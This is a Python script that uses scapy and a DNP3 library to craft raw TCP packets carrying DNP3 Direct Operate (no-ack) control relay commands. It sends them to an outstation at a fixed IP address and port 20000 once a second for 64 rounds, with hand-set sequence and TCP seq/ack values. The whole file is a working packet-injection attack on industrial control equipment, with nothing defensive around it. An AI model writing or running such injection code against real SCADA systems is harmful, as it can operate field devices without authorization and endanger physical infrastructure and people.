import DNP3_Lib.DNP3_Lib as DNP3_Lib
from scapy.layers.inet import TCP
from scapy.layers.inet import IP
from scapy.sendrecv import send
import time

dnp3Packet = {
    "DIR": 1,
    "FIR": 1,
    "FIN": 1,
    "SEQ1": 59,
    "SEQ2": 11,
    "CON": 0,
    "UNS": 0,
    "FUNC" : "DIRECT_OPERATE_NR"
    }

master = 3
outstation = 4

ip = "12.1.1.2"
port = "20000"

#For the actual data need to implement data chunk decoding:
    # Number of items, Point number, control code, count on/off time and control status
payload = b'\x01\x00\x00\x00\x03\x01\x64\x00\x00\x00\x64\x00\x00\x00\x00'
i = 0
j = 82
k = 15
while i < 64:
    dnp3Packet["SEQ1"] = i
    dnp3Packet["SEQ2"] = i
    packet = IP(dst=ip)/TCP(dport=20000, flags = 0x18, seq = j, ack = k)/\
        DNP3_Lib.DNP3(DESTINATION = outstation, SOURCE = master, CONTROL = \
            DNP3_Lib.DNP3HeaderControl())/\
                    DNP3_Lib.DNP3Transport(FIN=1, FIR=1, SEQUENCE = dnp3Packet['SEQ1'])/\
                    DNP3_Lib.DNP3ApplicationRequest(Application_control = \
                    DNP3_Lib.DNP3ApplicationControl(FIN = dnp3Packet['FIN'],\
                        FIR=dnp3Packet['FIR'], CON=dnp3Packet['CON'], UNS=dnp3Packet['UNS'],\
                        SEQ = dnp3Packet['SEQ2']), FUNC_CODE = dnp3Packet['FUNC'])/\
                    DNP3_Lib.DNP3RequestDataObjects(Obj=12,Var=1,IndexPref=2, QualfierCode=8)/payload
                      
    send(packet)
    time.sleep(1)
    i = i + 1
    j= j + 1
    k = 15 + 1
